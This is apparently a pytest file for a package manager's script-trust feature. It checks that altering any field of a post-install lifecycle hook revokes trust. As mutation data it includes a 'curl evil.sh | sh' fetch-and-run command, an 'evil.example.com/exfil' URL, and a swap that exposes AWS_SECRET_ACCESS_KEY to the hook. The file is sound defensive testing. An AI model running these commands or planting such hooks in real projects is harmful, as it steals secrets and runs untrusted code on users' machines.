"""Vector 3 -- hash-domain completeness.

Every execution-relevant field inside a lifecycle entry must be inside the
hashed subtree, so editing ANY of them revokes trust.  If a field that
changes runtime behavior lived outside the fingerprint, an attacker could
mutate it post-trust and still execute -- a break.

These assert the secure behavior (mutation -> trust revoked), so they pass
on head and act as regression traps.
"""

from __future__ import annotations

import copy
from pathlib import Path

import pytest
import yaml

from apm_cli.core.script_trust import is_project_scripts_trusted, trust_project_scripts

BASELINE = {
    "name": "pkg",
    "lifecycle": {
        "post-install": [
            {
                "type": "command",
                "bash": "echo hi",
                "command": "echo hi",
                "cwd": "subdir",
                "env": {"FOO": "bar"},
                "allowedEnvVars": ["ANALYTICS_TOKEN"],
                "timeoutSec": 30,
            },
            {
                "type": "http",
                "url": "https://hooks.example.com/notify",
                "headers": {"X-Token": "$ANALYTICS_TOKEN"},
                "timeoutSec": 10,
            },
        ]
    },
}


def _write(path: Path, data: dict) -> None:
    path.write_text(yaml.safe_dump(data, default_flow_style=False), encoding="utf-8")


def _mutate(base: dict, idx: int, key: str, value: object) -> dict:
    data = copy.deepcopy(base)
    data["lifecycle"]["post-install"][idx][key] = value
    return data


# (description, mutated-dict) pairs -- each must revoke trust.
MUTATIONS = [
    ("bash", _mutate(BASELINE, 0, "bash", "echo PWNED")),
    ("command", _mutate(BASELINE, 0, "command", "echo PWNED")),
    ("cwd", _mutate(BASELINE, 0, "cwd", "/etc")),
    ("env", _mutate(BASELINE, 0, "env", {"FOO": "evil"})),
    ("allowedEnvVars", _mutate(BASELINE, 0, "allowedEnvVars", ["AWS_SECRET_ACCESS_KEY"])),
    ("timeoutSec", _mutate(BASELINE, 0, "timeoutSec", 9000)),
    ("type", _mutate(BASELINE, 0, "type", "http")),
    ("url", _mutate(BASELINE, 1, "url", "https://evil.example.com/exfil")),
    ("headers", _mutate(BASELINE, 1, "headers", {"X-Token": "stolen"})),
]


@pytest.mark.parametrize("field,mutated", MUTATIONS, ids=[m[0] for m in MUTATIONS])
def test_mutating_execution_field_revokes_trust(
    apm_home: Path, tmp_path: Path, field: str, mutated: dict
) -> None:
    apm_yml = tmp_path / "apm.yml"
    _write(apm_yml, BASELINE)
    trust_project_scripts(apm_yml)
    assert is_project_scripts_trusted(apm_yml), "baseline should be trusted"

    _write(apm_yml, mutated)
    assert not is_project_scripts_trusted(apm_yml), (
        f"editing execution field '{field}' must revoke trust"
    )


def test_adding_new_script_entry_revokes_trust(apm_home: Path, tmp_path: Path) -> None:
    """Appending a brand-new (attacker) entry must revoke trust."""
    apm_yml = tmp_path / "apm.yml"
    _write(apm_yml, BASELINE)
    trust_project_scripts(apm_yml)

    injected = copy.deepcopy(BASELINE)
    injected["lifecycle"]["post-install"].append({"type": "command", "bash": "curl evil.sh | sh"})
    _write(apm_yml, injected)
    assert not is_project_scripts_trusted(apm_yml)


def test_adding_new_event_revokes_trust(apm_home: Path, tmp_path: Path) -> None:
    """Adding a new lifecycle event (e.g. pre-install) must revoke trust."""
    apm_yml = tmp_path / "apm.yml"
    _write(apm_yml, BASELINE)
    trust_project_scripts(apm_yml)

    injected = copy.deepcopy(BASELINE)
    injected["lifecycle"]["pre-install"] = [{"type": "command", "bash": "echo evil"}]
    _write(apm_yml, injected)
    assert not is_project_scripts_trusted(apm_yml)
